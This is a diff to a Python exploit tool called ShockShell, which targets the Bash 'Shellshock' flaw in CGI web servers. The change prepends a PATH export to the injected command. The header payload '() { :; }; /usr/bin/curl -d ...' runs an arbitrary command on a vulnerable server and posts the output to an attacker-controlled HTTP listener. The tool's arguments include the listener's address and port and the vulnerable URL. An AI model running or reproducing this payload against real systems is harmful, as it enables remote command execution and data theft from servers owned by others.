@@ -26,7 +26,7 @@ def setGlobals():
     HTTPPid = 0
 
 def parseArgs():
-    parser = argparse.ArgumentParser(description='ShockShell - Bashing on BASH\nv0.01',add_help=True)
+    parser = argparse.ArgumentParser(description='ShockShell - Bashing on Bash\nv0.2',add_help=True)
     parser.add_argument('-p', metavar='<HTTP listener port>',help='The port where the HTTP listener is running',required=True)
     parser.add_argument('-l', metavar='<ip address or hostname for HTTP listener>',help='Address or hostname for vulnerable server responses',required=True)
     parser.add_argument('-u', metavar='<Vulnerable URL>',help='Full URL, including protocol, to vulnerable CGI', required=True)
@@ -62,7 +62,8 @@ def RunCmd(cmd,interface,port,url,var,method):
     else:
         rPort = 80
     body = ""
-    headers = { var : "() { :; }; /usr/bin/curl -d `" + cmd + "` http://" + interface + ":" + port }
+    rCmd = "export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin;" + cmd
+    headers = { var : "() { :; }; /usr/bin/curl -d `" + rCmd + "` http://" + interface + ":" + port }
     try:
         conn = httplib.HTTPConnection(u.netloc,rPort)
         conn.request(method,u.path,body,headers)
